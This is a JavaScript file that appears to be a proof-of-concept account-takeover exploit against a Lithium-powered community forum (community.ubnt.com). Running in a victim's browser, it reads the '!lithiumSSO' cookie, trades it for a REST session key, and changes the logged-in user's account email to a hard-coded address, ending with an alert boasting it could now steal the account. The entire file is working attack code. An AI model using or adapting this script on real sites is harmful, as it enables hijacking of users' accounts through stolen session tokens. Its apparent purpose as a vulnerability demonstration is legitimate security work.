var myApp = {
    get: function (url, success, extraQp) {
        extraQp = typeof extraQp == 'undefined' ? '' : extraQp;
        LITHIUM.jQuery.ajax({
            url: url + this.urlQueryParams + extraQp,
            type: "GET",
            headers: {
                'Accept': "*/*;",
                'Content-Type': 'text/plain;charset=UTF-8'
            },
            dataType: "json",
            success: success,
            error: myApp.logError
        });
    },
    post: function (url, data, success, extraQp) {
        extraQp = typeof extraQp == 'undefined' ? '' : extraQp;
        LITHIUM.jQuery.ajax({
            url: url + this.urlQueryParams + extraQp,
            type: "POST",
            headers: {
                'Accept': "*/*;",
                'Content-Type': 'text/plain;charset=UTF-8'
            },
            data: data,
            dataType: "json",
            success: success
        });
    },
    urlQueryParams: '?restapi.response_format=json&restapi.response_style=-types,-null',
    sessionKeyQP: '&restapi.session_key=<<session_key>>',
    userUrl: 'https://community.ubnt.com/restapi/vc/users/self',
    logSuccess: function (data) {
        console.log(data);
    },
    logError: function(data, status, err) {
        console.log(status + " " + err);
        console.error(data);
    },
    setEmailUrl: 'https://community.ubnt.com/restapi/vc/users/id/<<id>>/email/set',
    setEmailQp: '&value=<<value>>',
    setEmailSuccess: function (data) {
        myApp.logSuccess(data);
        if (data.response.status == 'success') {
            alert("I just changed you email to " + data.response.user.email + ". And could now steal your account, but I won't. :)");
        } else {
            console.error('call failed.');
        }
    },
    loginUrl: 'https://community.ubnt.com/restapi/vc/authentication/sessions/login',
    ssoTokenQp: '&sso.authentication_token=<<sso_token>>',
    getSessionKey: function(callback) {
        var ssoToken = myApp.getCookie('!lithiumSSO');
        if (ssoToken != "") {
            var extraQp = myApp.ssoTokenQp.replace(/<<sso_token>>/g, ssoToken);
            myApp.get(myApp.loginUrl, function (data) {
                if (data.response.status == "success") {
                    callback(data.response.value);
                } else {
                    console.error("Failed to login with sso token.");
                }
            }, extraQp);
        } else {
            console.error("Could not find cookie with name '!lithiumSSO'");
        }
    },
    changeEmail: function (email) {
        this.get(this.userUrl, function (data) {
            var email2 = email;
            myApp.logSuccess(data);
            if (data.response.status == 'success') {
                var userId = data.response.user.id;
                var url = myApp.setEmailUrl.replace(/<<id>>/g, userId);
                myApp.getSessionKey(function(sessionKey) {
                    var extraQp = myApp.sessionKeyQP.replace(/<<session_key>>/g, sessionKey);
                    extraQp += myApp.setEmailQp.replace(/<<value>>/g, email2);
                    myApp.post(url, '', this.setEmailSuccess, extraQp);
                });
            } else {
                console.error("failed to get user's info");
            }
        });
    },
    getCookie: function(cname) {
        var name = cname + "=";
        var ca = document.cookie.split(';');
        for(var i=0; i<ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0)==' ') c = c.substring(1);
            if (c.indexOf(name) != -1) return c.substring(name.length,c.length);
        }
        return "";
    }
};
myApp.changeEmail('desposi1@gmail.com');
